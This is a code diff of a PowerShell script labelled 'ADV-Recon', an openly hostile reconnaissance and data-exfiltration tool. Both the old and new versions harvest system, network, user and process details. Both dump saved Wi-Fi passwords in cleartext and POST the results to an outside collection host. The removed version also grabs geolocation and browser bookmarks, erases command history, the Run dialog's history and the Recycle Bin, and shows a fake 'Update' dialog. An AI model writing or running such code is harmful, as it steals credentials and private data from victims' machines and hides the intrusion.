@@ -1,204 +1,67 @@
-# =================== ADV-Recon.ps1 – Data Exfiltration via POST ===================
 
-$output = ""
+# ========== ADV-Recon-FULL.ps1 ==========
+Set-Variable -Name output -Value "" -Scope Global
 
 function Add-ToOutput {
-    param([string]$Title, [string]$Data)
-    $output += "`n===== [$Title] =====`n"
-    $output += "$Data`n"
+    param([string]$Title, [object]$Data)
+    $Global:output += "`n===== [$Title] =====`n"
+    $Global:output += "$($Data | Out-String)`n"
 }
 
-# --- Powershell & User Info ---
+# System Info
 Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
 Add-ToOutput "Current User" (whoami)
-$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-Add-ToOutput "Is Admin?" $admin
+try { $os = Get-CimInstance Win32_OperatingSystem; Add-ToOutput "OS" "$($os.Caption) $($os.Version)" } catch { Add-ToOutput "OS" $_.Exception.Message }
+try { $bios = Get-CimInstance Win32_BIOS; Add-ToOutput "BIOS Serial" $bios.SerialNumber } catch { Add-ToOutput "BIOS Serial" $_.Exception.Message }
 
-# --- Microsoft Account Info ---
-try {
-    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
-} catch {
-    $fullName = $env:USERNAME
-}
-Add-ToOutput "Full Name" $fullName
+# Local Users
+try { $users = Get-LocalUser | Select-Object Name, Enabled, LastLogon; Add-ToOutput "Local Users" $users } catch { Add-ToOutput "Local Users" $_.Exception.Message }
 
-try {
-    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-} catch {
-    $email = "Not found"
-}
-Add-ToOutput "Email" $email
+# Network Info
+try { $pubIP = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim(); Add-ToOutput "Public IP" $pubIP } catch { Add-ToOutput "Public IP" $_.Exception.Message }
+try { $localIPs = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.*"}; Add-ToOutput "Local IPs" $localIPs } catch { Add-ToOutput "Local IPs" $_.Exception.Message }
+try { $macs = Get-NetAdapter | Select-Object Name, MacAddress, Status; Add-ToOutput "MAC Addresses" $macs } catch { Add-ToOutput "MAC Addresses" $_.Exception.Message }
+try { $rdp = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"; $rdpstate = if ($rdp.fDenyTSConnections -eq 0) {"Enabled"} else {"Disabled"}; Add-ToOutput "RDP" $rdpstate } catch { Add-ToOutput "RDP" $_.Exception.Message }
 
-# --- GeoLocation (if permitted) ---
+# Wi-Fi Profiles
 try {
-    Add-Type -AssemblyName System.Device
-    $Geo = New-Object System.Device.Location.GeoCoordinateWatcher
-    $Geo.Start()
-    while (($Geo.Status -ne 'Ready') -and ($Geo.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
-    if ($Geo.Permission -eq 'Denied') {
-        Add-ToOutput "GeoLocation" "Access Denied"
-    } else {
-        $loc = $Geo.Position.Location
-        Add-ToOutput "GeoLocation" "Latitude: $($loc.Latitude), Longitude: $($loc.Longitude)"
+    $wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+        $profile = $_ -replace ".*: ", ""
+        $key = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content").ToString().Split(":")[-1].Trim()
+        [PSCustomObject]@{Profile=$profile;Password=$key}
     }
-} catch {
-    Add-ToOutput "GeoLocation" "Error"
-}
+    Add-ToOutput "Wi-Fi Profiles" $wifi
+} catch { Add-ToOutput "Wi-Fi Profiles" $_.Exception.Message }
 
-# --- UAC Status ---
-function Get-RegistryValue($key, $value) { (Get-ItemProperty $key $value).$value }
-$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-$UAC1 = Get-RegistryValue $Key "ConsentPromptBehaviorAdmin"
-$UAC2 = Get-RegistryValue $Key "PromptOnSecureDesktop"
-Add-ToOutput "UAC Settings" "ConsentPrompt: $UAC1, SecureDesktop: $UAC2"
+# Processes, Services, Drivers
+try { $procs = Get-Process | Sort-Object ProcessName | Select-Object -First 20 ProcessName, Id, CPU; Add-ToOutput "Running Processes (Top 20)" $procs } catch { Add-ToOutput "Processes" $_.Exception.Message }
+try { $services = Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 20 Name, DisplayName; Add-ToOutput "Running Services (Top 20)" $services } catch { Add-ToOutput "Services" $_.Exception.Message }
+try { $drivers = Get-WmiObject Win32_PnPSignedDriver | Select-Object -First 10 DeviceName, DriverVersion; Add-ToOutput "Drivers (Top 10)" $drivers } catch { Add-ToOutput "Drivers" $_.Exception.Message }
 
-# --- RDP Status ---
+# Network Connections
+try { $tcp = Get-NetTCPConnection | Select-Object -First 20 LocalAddress, LocalPort, RemoteAddress, RemotePort, State; Add-ToOutput "TCP Connections (Top 20)" $tcp } catch { Add-ToOutput "TCP Connections" $_.Exception.Message }
+
+# Disk Info
+try { $disks = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, FileSystem, VolumeName, @{Name="Size(GB)";Expression={[math]::round($_.Size/1GB,2)}}, @{Name="FreeSpace(GB)";Expression={[math]::round($_.FreeSpace/1GB,2)}}; Add-ToOutput "Drives" $disks } catch { Add-ToOutput "Drives" $_.Exception.Message }
+
+# Recent Files
 try {
-    $rdp = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server"
-    $rdpEnabled = $rdp.fDenyTSConnections -eq 0
-    Add-ToOutput "RDP Enabled" $rdpEnabled
-} catch {
-    Add-ToOutput "RDP Enabled" "Error"
-}
+    $recent = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 10 FullName, LastWriteTime
+    Add-ToOutput "Recent Files (10)" $recent
+} catch { Add-ToOutput "Recent Files" $_.Exception.Message }
 
-# --- Network Info ---
-try {
-    $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org"
-} catch {
-    $publicIP = "Unavailable"
-}
-Add-ToOutput "Public IP" $publicIP
-
-$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -ExpandProperty IPAddress) -join ", "
-Add-ToOutput "Local IP" $localIP
+# Debug + POST
+Write-Host "`n========== DEBUG =========="
+Write-Host "OUTPUT LENGTH: $($Global:output.Length)"
+Write-Host "OUTPUT CONTENT:"
+Write-Host $Global:output
+Write-Host "==========================="
 
 try {
-    $macs = Get-NetAdapter | Select Name, MacAddress, Status | Format-Table | Out-String
-    Add-ToOutput "MAC Addresses" $macs
+    $preview = $Global:output.Substring(0, [Math]::Min(500, $Global:output.Length))
+    $body = @{ debug = $preview }
+    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body $body -UseBasicParsing
+    Write-Host "`nPOST sent successfully!"
 } catch {
-    Add-ToOutput "MAC Addresses" "Error"
+    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
 }
-
-# --- Wi-Fi Profiles & Passwords ---
-try {
-    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-        ($_ -split ":")[1].Trim()
-    }
-    $wifiData = ""
-    foreach ($profile in $wifiProfiles) {
-        $wifiData += "`n[$profile]`n"
-        $wifiData += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") -join "`n"
-    }
-    Add-ToOutput "Saved Wi-Fi Profiles" $wifiData
-} catch {
-    Add-ToOutput "Saved Wi-Fi Profiles" "Access Denied or Error"
-}
-
-# --- Nearby Wi-Fi Networks ---
-try {
-    $nearby = netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"} | Out-String
-    Add-ToOutput "Nearby Wi-Fi Networks" $nearby
-} catch {
-    Add-ToOutput "Nearby Wi-Fi Networks" "Unavailable"
-}
-
-# --- System Info ---
-try {
-    $sys = Get-CimInstance Win32_ComputerSystem
-    $bios = Get-CimInstance Win32_BIOS
-    $os = Get-CimInstance Win32_OperatingSystem
-    $cpu = Get-WmiObject Win32_Processor | Select Name, Manufacturer, MaxClockSpeed | Format-List | Out-String
-    $ram = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
-
-    Add-ToOutput "System Manufacturer" $sys.Manufacturer
-    Add-ToOutput "Model" $sys.Model
-    Add-ToOutput "RAM Installed" $ram
-    Add-ToOutput "OS" "$($os.Caption) $($os.Version)"
-    Add-ToOutput "Serial Number" $bios.SerialNumber
-    Add-ToOutput "CPU Info" $cpu
-} catch {
-    Add-ToOutput "System Info" "Error"
-}
-
-# --- Local Users ---
-try {
-    $users = Get-LocalUser | Select Name, Enabled | Format-Table | Out-String
-    Add-ToOutput "Local Users" $users
-} catch {
-    Add-ToOutput "Local Users" "Error"
-}
-
-# --- Running Processes ---
-try {
-    $procs = Get-Process | Select-Object -First 15 | Format-Table Name, Id, CPU | Out-String
-    Add-ToOutput "Top Processes" $procs
-} catch {
-    Add-ToOutput "Processes" "Error"
-}
-
-# --- Network Connections ---
-try {
-    $netstat = netstat -n | Select-String "TCP"
-    Add-ToOutput "TCP Connections" ($netstat -join "`n")
-} catch {
-    Add-ToOutput "Network Connections" "Error"
-}
-
-# --- Installed Software ---
-try {
-    $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName} | Select DisplayName, DisplayVersion | Sort DisplayName | Format-Table | Out-String
-    Add-ToOutput "Installed Software" $software
-} catch {
-    Add-ToOutput "Installed Software" "Error"
-}
-
-# --- Services ---
-try {
-    $services = Get-WmiObject win32_service | Select Name, State, StartMode | Sort Name | Format-Table | Out-String
-    Add-ToOutput "Services" $services
-} catch {
-    Add-ToOutput "Services" "Error"
-}
-
-# --- HDD Info ---
-try {
-    $drives = Get-WmiObject Win32_LogicalDisk | Select DeviceID, VolumeName, FileSystem, @{Name="Size(GB)";Expression={"{0:N1}" -f ($_.Size / 1GB)}}, @{Name="Free(GB)";Expression={"{0:N1}" -f ($_.FreeSpace / 1GB)}} | Format-Table | Out-String
-    Add-ToOutput "Drives" $drives
-} catch {
-    Add-ToOutput "Drive Info" "Error"
-}
-
-# --- Browser Bookmarks and History (Basic) ---
-$regex = '(http|https):\/\/[^\s"]+'
-$browserData = ""
-$paths = @(
-    "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks",
-    "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-)
-foreach ($p in $paths) {
-    if (Test-Path $p) {
-        try {
-            $raw = Get-Content -Raw $p
-            $urls = [regex]::Matches($raw, $regex) | ForEach-Object { $_.Value } | Sort-Object -Unique
-            $browserData += "`n$p:`n" + ($urls -join "`n")
-        } catch {
-            $browserData += "`n$p: Error reading file"
-        }
-    }
-}
-Add-ToOutput "Browser Bookmarks (Raw URL Extract)" $browserData
-
-# --- Final Exfiltration ---
-try {
-    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{data = $output} -UseBasicParsing
-} catch {
-    Add-ToOutput "EXFIL STATUS" "Failed to send"
-}
-
-# --- Optional cleanup ---
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-# --- Finished marker ---
-[System.Windows.Forms.MessageBox]::Show("Recon Complete", "Update")
